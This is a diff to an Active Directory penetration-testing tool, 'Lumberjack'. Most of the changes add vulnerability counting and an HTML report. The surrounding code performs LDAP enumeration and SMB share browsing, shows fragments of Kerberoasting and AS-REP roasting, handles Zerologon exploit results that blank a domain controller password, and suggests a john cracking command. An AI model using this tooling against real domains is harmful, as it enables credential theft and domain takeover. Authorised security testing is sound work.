@@ -1,12 +1,16 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
+from os import link
+
+
 try:
 	#Module imports
-	import argparse, ldap3, json, re, random, sys, socket, textwrap
+	import argparse, dominate, ldap3, json, re, random, sys, socket, textwrap
 
 	#Other imports
 	from binascii import hexlify, unhexlify
 	from datetime import datetime, timedelta
+	from dominate.tags import *
 	from getpass import getpass
 	from ldap3 import SUBTREE, ALL_ATTRIBUTES 
 	from ldap3.core.exceptions import LDAPBindError, LDAPException	
@@ -89,7 +93,7 @@ class Connect (object):
 #Enumeration Class
 class EnumerateAD(object):
 
-	def __init__(self, server, conn, kerberoast, smb, fuzz, domain, username, password, dc_ip, status, large, asrep, root=None):
+	def __init__(self, server, conn, kerberoast, smb, fuzz, domain, username, password, dc_ip, status, large, asrep, vulns, root=None):
 		
 		self.asrep = asrep
 		self.large = large
@@ -103,9 +107,20 @@ class EnumerateAD(object):
 		self.kerberoast = kerberoast
 		self.server = server
 		self.conn = conn
+		self.vulns = vulns
+		
+		#lists
 		self.computers = []
+		self.compWrite = []
 		self.spn = []   
+		self.spnWrite = []
 		self.users = []
+		self.userWrite = []
+		self.groupWrite = []
+		self.ouWrite = []
+		self.adminWrite = []
+		self.uncontrainedWrite = []
+		self.asrepWrite = []
 
 		if root is None:
             		self.root = self.getRoot()
@@ -133,17 +148,19 @@ class EnumerateAD(object):
 							size_limit=0)
 				for entry in self.entry_generator:
 					pprint(entry)
+					self.userWrite.append(self.conn.entries)
 				console.print ("[+] Success: Got all domain users\n", style = "success")
 			#Search AD Users 
 			else:
 				self.conn.search('%s' % (self.root), search_filter='(objectCategory=person)',
-						 attributes=['sAMAccountName'], size_limit=0)
+						 attributes=['sAMAccountName'], 
+						 size_limit=0)
 				for entry in self.conn.entries:
 					name = entry["sAMAccountName"][0]
 					userObj.append({
 						print(f'[+] {name} \n'),
 					})
-
+					self.userWrite.append(name)
 				console.print("[+] Success: Got all Domain Users\n", style = "success")
 				console.print("[-] Found {0} Domain Users\n".format(len(self.conn.entries)), style = "info")
 		except LDAPException as e:
@@ -159,6 +176,7 @@ class EnumerateAD(object):
 			self.conn.unbind()
 			console.print ("[-] Warning: Aborted\n", style = "warning")
 			sys.exit(1)
+		
 
 	#Enumerate Active Directory Computers		
 	def enumComputers(self):
@@ -170,14 +188,14 @@ class EnumerateAD(object):
 			console.rule("[bold red]Domain Computers")
 			print('')
 			#Search AD Computers
-			self.conn.search('%s' % (self.root), search_filter='(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
-					 	attributes=['name','dnshostname'], size_limit=0)
+			self.conn.search('%s' % (self.root), search_filter='(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))', attributes=['name','dnshostname'], size_limit=0)
 			for entry in self.conn.entries:
 				name = entry["dnshostname"][0]
 				computerObjects.append({
 					print(f'[+] {name} \n'),
 				})
 				self.computers.append(entry)
+				self.compWrite.append(name)
 			console.print ("[+] Success: Got all Domain Computers\n", style = "success")
 			console.print('[-] Found {0} Computers\n'.format(len(self.conn.entries)), style = "info")
 			if self.smb:
@@ -210,13 +228,13 @@ class EnumerateAD(object):
 			console.rule("[bold red]Domain Groups")
 			print('')
 			#Search AD Group
-			self.conn.search('%s' % (self.root), search_filter='(objectCategory=group)',
-					 attributes=['distinguishedName', 'cn'], size_limit=0)
+			self.conn.search('%s' % (self.root), search_filter='(objectCategory=group)', attributes=['distinguishedName', 'cn'], size_limit=0)
 			for entry in self.conn.entries:
-				name = entry["distinguishedName"][0]
+				name = entry["cn"][0]
 				groupobj.append({
 					print(f'[+] {name} \n'),
 				})
+				self.groupWrite.append(name)
 			console.print ("[+] Success: Got all groups\n", style = "success")
 			console.print('[-] Found {0} groups\n'.format(len(self.conn.entries)), style = "info")
 		except LDAPException as e:
@@ -243,13 +261,13 @@ class EnumerateAD(object):
 			console.rule("[bold red]Organisational Units")
 			print('')
 			#Search AD Organisational Units
-			self.conn.search('%s' % (self.root), search_filter='(objectclass=organizationalUnit)',
-					 attributes=['distinguishedName'], size_limit=0)
+			self.conn.search('%s' % (self.root), search_filter='(objectclass=organizationalUnit)', attributes=['ou'], size_limit=0)
 			for entry in self.conn.entries:
-				name = entry["distinguishedName"][0]
+				name = entry["ou"][0]
 				ouObj.append({
 					print(f'[+] {name} \n'),
 				})
+				self.ouWrite.append(name)
 			console.print ("[+] Success: Got all OUs\n", style = "success")
 			console.print('[-] Found {0} OUs\n'.format(len(self.conn.entries)), style = "info")
 		except LDAPException as e:
@@ -275,17 +293,18 @@ class EnumerateAD(object):
 			sleep(1)
 			console.rule("[bold red]Admin Users")
 			print('')
-			self.conn.search('%s' % (self.root), '(&(adminCount=1)(objectclass=person))',
-					 attributes=['sAMAccountName'], size_limit=0)
+			self.conn.search('%s' % (self.root), '(&(adminCount=1)(objectclass=person))', attributes=['sAMAccountName'], size_limit=0)
 			for entry in self.conn.entries:
 				name = entry["sAMAccountName"][0]
 	
 				admin_users.append({
 					print(f'[+] {name} \n'),
 				})
+				self.adminWrite.append(name)
 			console.print ("[+] Success: Got all Admins\n", style = "success")
 			if len(admin_users) >= 6:
 				console.print ("[!] Vulnerability: Domain has too many Admin Accounts\n", style = "error")
+				self.vulns +=1
 			console.print('[-] Found {0} Admins\n'.format(len(self.conn.entries)), style = "info")
 		except LDAPException as e:
 			console.print ("[-] Warning: No Admins Found\n", style = "warning")
@@ -310,8 +329,7 @@ class EnumerateAD(object):
 			sleep(1)
 			console.rule("[bold red]Domain Policies")
 			print('')
-			self.conn.search('%s' % (self.root), '(objectClass=domain)',
-					 attributes=ALL_ATTRIBUTES, size_limit=0)
+			self.conn.search('%s' % (self.root), '(objectClass=domain)', attributes=ALL_ATTRIBUTES, size_limit=0)
 			MachineAccountQuota = None
 			for entry in self.conn.entries:
 				name = entry["ms-DS-MachineAccountQuota"][0]
@@ -325,6 +343,7 @@ class EnumerateAD(object):
         			console.print("[-] Not vulnerable, cannot proceed with Machine creation\n")
 			else:
 				console.print ("[!] Vulnerability: Possible Attack Vector, can be exploited further\n", style = "error")
+				self.vulns +=1
 			console.print('[-] Found {0} Domain Policies\n'.format(len(self.conn.entries)), style = "info")
 
 		except LDAPException as e:
@@ -350,16 +369,17 @@ class EnumerateAD(object):
 			sleep(1)
 			console.rule("[bold red]Unconstrained Delegation")
 			print('')
-			self.conn.search('%s' % (self.root),
-					 search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)',
-					 attributes=["sAMAccountName"],  size_limit=0)
+			self.conn.search('%s' % (self.root), search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', attributes=["sAMAccountName"],  size_limit=0)
 			for entry in self.conn.entries:
 				name = entry["sAMAccountName"][0]
 				unconstrained.append({
 					print(f'[+] {name} \n'),
 				})
+				self.uncontrainedWrite.append(name)
+			console.print ("[+] Success: Got all Users with Unconstrained Delegation\n", style = "success")
 			if len(self.conn.entries) >= 1:
 				console.print ("[!] Vulnerability: Domain Vulnerable to Unconstrained Delegation\n", style = "error")
+				self.vulns +=1
 			console.print('[-] Found {0} account(s) with Unconstrained Delegation\n'.format(len(self.conn.entries)), style = "info")
 		except LDAPException as e:   
 			console.print ("[-] Warning: No Affected Users Found\n", style = "warning")
@@ -385,17 +405,20 @@ class EnumerateAD(object):
 			console.rule("[bold red]SPN Accounts")
 			print('')
 			self.filter = "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
-			self.conn.search('%s' % (self.root),
-					 search_filter=self.filter, attributes=['name', 'userPrincipalName', 'servicePrincipalName'],
-					 size_limit=0)
+			self.conn.search('%s' % (self.root), search_filter=self.filter, attributes=['name', 'userPrincipalName', 'servicePrincipalName'], size_limit=0)
 
 			for entry in self.conn.entries:
 				name = entry["userPrincipalName"][0]
-				self.spn.append(entry)
 				spnslist.append({
 					print(f'[+] {name} \n'),
 				})
+				self.spn.append(entry)
+				self.spnWrite.append(name)
+				
 			console.print ("[+] Success: Got all SPNs\n", style = "success")
+			if len(self.conn.entries) >= 1:
+				console.print ("[!] Vulnerability: Target might be vulnerable to Kerberoasting\n", style = "error")
+				self.vulns +=1
 			console.print('[-] Found {0} SPN Account(s)\n'.format(len(self.conn.entries)), style = "info")
 			if self.kerberoast:
 				ExploitAD.kerberoast(self.dc_ip, self.spn, self.username, self.password, self.domain, self.status)
@@ -431,15 +454,14 @@ class EnumerateAD(object):
 			asRepObj.append({
 				print(f'[+] {name} \n'),
 			})
+			self.asrepWrite.append(name)
 			self.users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.domain))
 		if len(self.conn.entries) >= 1:
 			console.print ("[!] Vulnerability: Domain Users Vulnerable to AS-REP Roasting\n", style = "error")
-			print('')
+			self.vulns +=1
 		console.print('[-] Found {0} account(s) that Dont Require Kerberos Pre-Authentication\n'.format(len(self.conn.entries)), style = "info")
 		if self.asrep:
 				ExploitAD.ASREPRoast(self.users, self.domain, self.dc_ip, self.status)
-		else:	
-			sys.exit(1)
 		
 	#Fuzz AD with ANR (Ambiguous Name Resolution)
 	def searchRandom(self, fobject, objectCategory=''):
@@ -453,9 +475,7 @@ class EnumerateAD(object):
 		else:
 			searchFilter = '(anr={})'.format(fobject)
 		try:	
-			self.conn.search('%s' % (self.root),
-					 search_filter=searchFilter, search_scope=SUBTREE,
-					 attributes = ALL_ATTRIBUTES, size_limit=0)
+			self.conn.search('%s' % (self.root), search_filter=searchFilter, search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
 			console.print('[-] Found {0} Objects'.format(len(self.conn.entries)), style = "info")
 			pprint(self.conn.entries) 
 		except LDAPException as e:   
@@ -478,7 +498,7 @@ class EnumerateAD(object):
 
 	def enumSMB(self):
 
-		self.status.update("[bold white]Enumerating SMB: '{}'\n".format(fobject))		
+		self.status.update("[bold white]Enumerating SMB...\n")		
 		try:
 			console.rule("[bold red]Enumerating SMB")
 			print('')
@@ -487,7 +507,7 @@ class EnumerateAD(object):
 					# Changing default timeout as shares should respond withing 5 seconds if there is a share
 					# and ACLs make it available to self.user with self.passwd
 					smbconn = smbconnection.SMBConnection('\\\\' + str(dnsname), str(dnsname), timeout=5)
-					smbconn.login(self.dUser, self.dPassword)
+					smbconn.login(self.username, self.password)
 					dirs = smbconn.listShares()
 					self.smbBrowseable[str(dnsname)] = {}
 					for share in dirs:
@@ -502,7 +522,6 @@ class EnumerateAD(object):
 					continue
 		except ValueError:
 				pass
-		print('')
 		availDirs = []
 		for key, value in self.smbBrowseable.items():
 			for _, v in value.items():
@@ -511,14 +530,14 @@ class EnumerateAD(object):
 
 		if len(self.smbShareCandidates) == 1:
 			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}\n".format(len(self.smbShareCandidates), 
-						len(self.smbBrowseable.keys()), len(availDirs), self.dUser), style = "info")
+						len(self.smbBrowseable.keys()), len(availDirs), self.username), style = "info")
 		else:
 			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}\n".format(len(self.smbShareCandidates), 
-						len(self.smbBrowseable.keys()), len(availDirs), self.dUser), style = "info")
+						len(self.smbBrowseable.keys()), len(availDirs), self.username), style = "warning")
 		if len(self.smbBrowseable.keys()) > 0:
-			with open('{0}-open-smb.json'.format(self.dc), 'w') as f:
+			with open('{0}-open-smb.json'.format(self.domain), 'w') as f:
 				json.dump(self.smbBrowseable, f, indent=4, sort_keys=False)
-			console.print('[+] Success: Wrote browseable shares to {0}-open-smb.json\n'.format(self.dc), style = 'success')
+			console.print('[+] Success: Wrote browseable shares to {0}-open-smb.json\n'.format(self.domain), style = 'success')
 
 #Exploitation Class
 class ExploitAD(object):
@@ -612,11 +631,9 @@ class ExploitAD(object):
 				result = ExploitAD.try_zerologon(dc_handle, rpc_con, target_computer)
 				if result["ErrorCode"] == 0:
 	
-					console.print("[+] Success: Exploit completed! Domain Controller's account password has been set to an empty string\n",
-						      style = "success")
+					console.print("[+] Success: Exploit completed! Domain Controller's account password has been set to an empty string\n", style = "success")
 				else:
-					console.print("[-] Warning: Non-zero return code, something went wrong. Domain Controller returned: {}\n".format(result["ErrorCode"]),
-						      style = "warning")
+					console.print("[-] Warning: Non-zero return code, something went wrong. Domain Controller returned: {}\n".format(result["ErrorCode"]), style = "warning")
 			else:
 				console.print("[-] Aborted\n", style = "warning")
 				sys.exit(0)
@@ -642,15 +659,17 @@ class ExploitAD(object):
 
 		TGT_size, TGT_size_2 = len(tgt),len(tgt_2)
 
-		console.print("[+] Length of TGT size with PAC: {TGT_size} \n", style = 'info')
+		console.print("[+] Length of TGT size with PAC: {} \n".format(TGT_size), style = 'info')
 
-		console.print("[+] Length of TGT size without PAC: {TGT_size_2} \n", style = 'info')
+		console.print("[+] Length of TGT size without PAC: {} \n".format(TGT_size_2), style = 'info')
 
 		if TGT_size == TGT_size_2:
 			console.print( "[-] Not Vulnerable, PAC validated\n")
 		else:
 			console.print("[!] Vulnerability: Possibly vulnerable to CVE-2021-42287. \n\n[+] Apply Patches", style = 'error')
-	
+			self.vulns +=1
+
+				
 	#Kerberoasting: From GetUserSPNs.py			
 	def kerberoast(dc_ip, spn, username, password, domain, status):
 		
@@ -720,8 +739,7 @@ class ExploitAD(object):
 					for key, value in user_tickets.items():
 						f.write('{0}:{1}\n'.format(key, value))
 				if len(user_tickets.keys()) >= 1:
-					console.print('[+] Success: Received and wrote {0} ticket(s) for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets\n'.format(len(user_tickets.keys()),
-					domain), style = 'success')	
+					console.print('[+] Success: Received and wrote {0} ticket(s) for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets\n'.format(len(user_tickets.keys()), domain), style = 'success')	
 			else:
 				console.print('[-] Received {0} ticket(s) for Kerberoasting\n'.format(len(user_tickets.keys())), style = 'warning')
 			
@@ -785,8 +803,7 @@ class ExploitAD(object):
 				response = sendReceive(msg, Domain, dc_ip)
 			except KerberosError as e:
 				if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-					supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
-							    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+					supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
 					seq_set_iter(requestBody, 'etype', supportedCiphers)
 					msg = encoder.encode(asReq)
 					response = sendReceive(msg, Domain, dc_ip)
@@ -831,7 +848,49 @@ def parse_credentials(credentials):
 	domain, username, password = credential_regex.match(credentials).groups('')
 
 	return domain, username, password
+
+#write out to files
+def report(filename, usr, cmp, g, o, a, spn, ud, asrep, vulns):
+
+	table_headers = ['Object']
+
+	doc = dominate.document(title='Lumberjack report')
+
+	with doc.head: 
+		link(rel='stylesheet', href='style.css')
+
+	with doc:
+		with div(cls='container'):
+			h1('Lumberjack Report')
+			with table(id='main', cls='table table-striped'):
+				caption(h3('User Accounts'))
+				with thead():
+					with tr():
+						for table_head in table_headers:
+							th(table_head)
+				with tbody():
+					for i in usr:
+						with tr():
+							td(i)
+			with table(id='main', cls='table table-striped'):
+				caption(h3('Client Machines'))
+				with thead():
+					with tr():
+						for table_head in table_headers:
+							th(table_head)
+				with tbody():
+					for i in cmp:
+						with tr():
+							td(i)
+
+							
+	pprint("Generating report called {}.html".format(filename))
 	
+	with open('{}.html'.format(filename), 'w') as f:
+		for d in doc:
+				f.write(str(d) + '\n')
+				print('')
+
 def main():
 
 	parser = argparse.ArgumentParser(prog='Lumberjack', add_help=False, formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''
@@ -861,11 +920,15 @@ def main():
 	parser.add_argument('-asrep', help='AS-REP Roasting', action='store_true')
 	parser.add_argument('-smb', '--smb', help='enumerate SMB shares', action='store_true')
 	parser.add_argument('-f', '--fuzz', type=str)
+	parser.add_argument('--report', type=str, help='Create HTML Report') 
 	args = parser.parse_args()
 	
 	#split credentials into their three components: name of DC, username, and the password
 	domain, username, password = parse_credentials(args.credentials)
 	dc_ip = args.ip_address
+	
+	#vulnerability counter
+	vulns = 0
 	
 	#Display help page if no arguments are provided
 	if len(sys.argv) < 2:
@@ -879,7 +942,7 @@ def main():
 	if password == '' and username != '':
 		status.update("[bold white]Enter a Password:\n")
 		password = getpass("")
-
+	
 	if args.fuzz:
 		args.enumerate = False
 		args.exploit = False
@@ -902,20 +965,19 @@ def main():
 			console.print("[-] Error: {} is not a valid domain name'\n".format(domain), style = "error")
 			sys.exit(1)
 	
-	
 	#password strength regex
 	pswdreg = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!#%*?&]{8,18}$"
 	match_re = re.compile(pswdreg)
 	pwdres = re.search(match_re, password)
-	if not pwdres:
-		console.print("[!] Vulnerability: Active Directory has a weak password policy\n", style = "error")
-
-			
+	
 	titleArt()
 
 	console.print("[+] Success: Lumberjack Started\n", style="success")
 	console.print("[-] Input Values", style="info")
 	print(f"Domain : {domain} \nUsername : {username} \nPassword: {password} \nIP Address : {dc_ip}\n")
+	if not pwdres:
+		console.print("[!] Vulnerability: Active Directory has a weak password policy\n", style = "error")
+		vulns += 1
 	
 	#The clock is running!	
 	start_time = datetime.now()
@@ -939,7 +1001,7 @@ def main():
 	
 	#Run main features
 	try:
-		enumAD = EnumerateAD(s, c, args.kerberoast, args.smb, args.fuzz, domain, username, password, dc_ip, status, args.large, args.asrep)
+		enumAD = EnumerateAD(s, c, args.kerberoast, args.smb, args.fuzz, domain, username, password, dc_ip, status, args.large, args.asrep, vulns)
 		if args.enumerate is not False:
 			status.update("[bold white]Waiting...\n")
 			console.print ("[-] Enumerate Users?\n", style = "status")
@@ -951,6 +1013,17 @@ def main():
 	except KeyboardInterrupt:
 		console.print ("[-] Warning: Aborting\n", style = "warning")
 			
+	console.rule("[bold red]")
+	print('')
+	print('')
+	
+	#generate HTML report
+	usr, cmp, g, o, a, spn, ud, asrep, vulnsCount = enumAD.userWrite, enumAD.compWrite, enumAD.groupWrite, enumAD.ouWrite, enumAD.adminWrite, enumAD.spnWrite, enumAD.uncontrainedWrite, enumAD.asrepWrite, enumAD.vulns
+	if args.report:
+		report(args.report, usr, cmp, g, o, a, spn, ud, asrep, vulns)
+	
+	console.print ("[!] {0} vulnerabilities found in {1}\n".format(vulnsCount, domain), style = 'error')
+		
 	#Exit Lumberjack
 	status.update("[bold white]Exiting Lumberjack...\n")
 	sleep(1)
